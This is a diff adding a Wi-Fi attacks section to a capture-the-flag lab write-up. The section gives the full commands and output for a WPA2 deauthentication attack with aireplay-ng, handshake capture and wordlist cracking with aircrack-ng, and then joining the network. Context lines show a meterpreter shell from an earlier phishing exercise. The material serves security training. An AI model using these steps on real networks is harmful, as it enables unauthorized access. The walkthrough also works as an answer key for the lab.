@@ -10,6 +10,7 @@
 * [Day 8: Shellcodes - Shellcodes of the world, unite!](#day-8-shellcodes---shellcodes-of-the-world-unite)
 * [Day 9: GRC - Nine o'clock, make GRC fun, tell no one](#day-9-grc---nine-oclock-make-grc-fun-tell-no-one)
 * [Day 10: Phishing - He had a brain full of macros, and had shells in his soul](#day-10-phishing---he-had-a-brain-full-of-macros-and-had-shells-in-his-soul)
+* [Day 11: Wi-Fi attacks - If you'd like to WPA, press the star key!](#day-11-wi-fi-attacks---if-youd-like-to-wpa-press-the-star-key)
 
 ## Day 1: OPSEC - Maybe SOC-mas music, he thought, doesn't come from a store?
 
@@ -383,4 +384,155 @@ mv /root/.msf4/local/msf.docm /root/invoice.docm
 4) After a few seconds a shell should appear in first terminal:
 ```shell
 meterpreter> cat /Users/Administrator/Desktop/flag.txt 
+```
+
+## Day 11: Wi-Fi attacks - If you'd like to WPA, press the star key!
+
+Connect to the machine (Password321):
+```shell
+ssh glitch@x.x.x.x
+```
+
+Show wireless devices:
+```shell
+iw dev
+
+phy#2
+	Interface wlan2
+		ifindex 5
+		wdev 0x200000001
+		addr 02:00:00:00:02:00
+		type managed
+		txpower 20.00 dBm
+```
+
+Scan for nearby Wi-Fi networks:
+```shell
+sudo iw dev wlan2 scan
+
+BSS 02:00:00:00:00:00(on wlan2)
+	last seen: 192.392s [boottime]
+	TSF: 1733935425101305 usec (20068d, 16:43:45)
+	freq: 2437
+	beacon interval: 100 TUs
+	capability: ESS Privacy ShortSlotTime (0x0411)
+	signal: -30.00 dBm
+	last seen: 0 ms ago
+	Information elements from Probe Response frame:
+	SSID: MalwareM_AP
+	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
+	DS Parameter set: channel 6
+	ERP: Barker_Preamble_Mode
+	Extended supported rates: 24.0 36.0 48.0 54.0 
+	RSN:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+	Supported operating classes:
+		 * current operating class: 81
+	Extended capabilities:
+		 * Extended Channel Switching
+		 * Operating Mode Notification
+```
+
+**What is the BSSID of our wireless interface?**
+
+```shell
+sudo iw dev wlan2 info | grep addr | awk '{print $2}'
+```
+
+Turn device off, switch to monitor mode and turn device back on:
+```shell
+sudo ip link set dev wlan2 down
+sudo iw dev wlan2 set type monitor
+sudo ip link set dev wlan2 up
+sudo iw dev wlan2 info
+
+Interface wlan2
+	ifindex 5
+	wdev 0x200000001
+	addr 02:00:00:00:02:00
+	type monitor
+	wiphy 2
+	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+	txpower 20.00 dBm
+```
+
+Capture Wi-Fi traffic in the area, specifically targeting the WPA handshake packets, **you can CTRL+C to exit**:
+```shell
+sudo airodump-ng wlan2
+
+CH 11 ][ Elapsed: 6 s ][ 2024-12-11 17:30
+
+BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+```
+
+Once we have MalwareM_AP access point's BSSID, focus on it and capture the WPA handshake, **keep this command running in one terminal**:
+```shell
+sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
+
+CH  6 ][ Elapsed: 24 s ][ 2024-12-11 17:32
+
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+02:00:00:00:00:00  -28 100      250        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP
+
+BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+02:00:00:00:00:00  02:00:00:00:01:00  -29    0 - 1      0        1
+```
+
+**What is the BSSID of the wireless interface that is already connected to the access point?**
+
+From the output of the previous command we see a STATION connected with BSSID `02:00:00:00:01:00`
+
+Launch the deauthentication attack **in a second terminal**:
+```shell
+sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
+
+17:35:32  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
+17:35:32  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
+```
+
+**What is the PSK after performing the WPA cracking attack?**
+
+Attempt to crack the WPA/WP2 passphrase:
+```shell
+sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
+
+KEY FOUND! [ the-cracked-psk ]
+```
+
+Exit process in first terminal (`sudo airodump-ng ...`) and join the MalwareM_AP access point:
+```shell
+wpa_passphrase MalwareM_AP 'the-cracked-psk' > config
+sudo wpa_supplicant -B -c config -i wlan2
+```
+
+Wait a few seconds until we have joined the MalwareM_AP SSID
+```shell
+iw dev wlan2 info
+
+Interface wlan2
+	ifindex 5
+	wdev 0x200000001
+	addr 02:00:00:00:02:00
+	ssid MalwareM_AP
+	type managed
+	wiphy 2
+	channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
+	txpower 20.00 dBm
+```
+
+**What is the SSID and BSSID of the access point? Format: SSID, BSSID**
+
+```shell
+SSID=$(sudo iw dev wlan2 link | grep SSID | awk '{print $2}')
+BSSID=$(sudo iw dev wlan2 link | grep "Connected to" | awk '{print $3}')
+echo $SSID, $BSSID
 ```
